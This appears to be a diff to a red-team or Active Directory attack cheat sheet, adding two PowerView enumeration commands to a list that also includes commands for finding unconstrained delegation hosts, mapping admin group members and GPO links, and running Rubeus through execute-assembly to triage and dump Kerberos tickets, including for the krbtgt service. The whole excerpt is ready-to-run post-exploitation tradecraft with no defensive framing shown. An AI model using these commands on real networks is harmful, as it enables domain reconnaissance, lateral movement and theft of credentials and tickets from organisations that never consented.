@@ -23,7 +23,9 @@ the server or the service account that is granted this right is able to imperson
 powershell Get-DomainComputer -Unconstrained -Properties DnsHostName
 powershell Get-DomainGPOLocalGroup
 powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | select -exp membername 
+powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername  
 powershell Get-DomainOU -GPLink '{66465373-16CB-4F96-BD3A-12AE7D2C2371}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
+powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins'  
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
 Rubeus dump /luid:0x1b37e  
